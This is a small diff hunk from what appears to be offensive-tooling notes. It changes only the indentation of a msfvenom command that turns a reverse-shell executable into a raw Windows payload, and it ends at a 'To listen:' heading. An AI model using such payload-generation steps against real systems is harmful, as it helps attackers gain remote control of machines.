@@ -13,7 +13,7 @@ To create payload:
 
 I converted a working reverse shell exe to a raw binary file:
 
-            msfvenom -p windows/exec CMD=file.exe -f raw -o file.raw
+        msfvenom -p windows/exec CMD=file.exe -f raw -o file.raw
 
 To listen:
 
